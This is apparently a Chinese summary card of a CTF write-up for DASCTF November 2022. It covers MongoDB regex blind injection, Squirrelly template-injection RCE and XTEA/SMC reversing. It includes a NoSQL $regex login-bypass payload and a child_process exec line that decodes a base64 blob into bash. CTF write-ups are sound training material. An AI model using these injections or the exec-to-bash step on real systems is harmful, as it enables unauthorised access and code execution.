---
title: "2022 十一月 DASCTF WriteUp By EDISEC"
category: web
tags: ["DASCTF 2022 11月", "web", "MongoDB正则注入", "Squirrelly模板注入", "XTEA变种", "SMC自修改"]
signals: ["DASCTF 2022 11月 2022", "MongoDB正则注入", "Squirrelly模板注入", "XTEA变种", "SMC自修改", "z3求解", "Sbox替换", "sqli", "MongoDB", "Squirrelly", "RCE", "XTEA", "SMC", "lte"]
difficulty: medium
source: "https://www.ctfiot.com/81575.html"
tools: ["Z3"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 十一月 DASCTF WriteUp By EDISEC

> 赛事：DASCTF 2022 11月 2022 | 方向：web | 难度：medium | 工具：Z3

## 一句话总结

3 题：MongoDB 正则盲注 + Squirrelly RCE + XTEA 变种/SMC 逆向。

## 攻击链

1. 过滤 gt/lt/lte/gte/eq/ne/where 用 MongoDB 正则盲注
2. {"username":{"$regex":"^admi"}} 爆破 admin
3. Squirrelly 模板 autoEscape:false + 默认 filter 注入 RCE
4. require('child_process').exec('echo L2J....Q==|base64 -d|bash') 一把梭
5. babytea: XTEA 变种解密，delta XOR 0x1234567 校正
6. babysmc: cap 单字节 XOR 暴力扫 0x21/0x23 还原指令
7. z3 求解 16 字节输入满足 dword_422000 线性方程
8. 5 轮 Sbox 替换 (Fun_0x7/0xb/0xd/0x11/0x13/0x17/0x1d) 还原 flag

## 关键 payload

```
{"username":{"$regex":"^admi"},"password":{"$regex":".*"}}
```

## 经验教训

Squirrelly 默认 autoEscape:true 关闭 → filter 参数 RCE；XTEA 变种关键是 delta 循环的 XOR 校正。

## 标签

MongoDB正则注入、Squirrelly模板注入、XTEA变种、SMC自修改、z3求解、Sbox替换

## 参考来源

- https://www.ctfiot.com/81575.html
- 原文件：2022十一月DASCTF-WriteUp_By_EDISEC.full.md
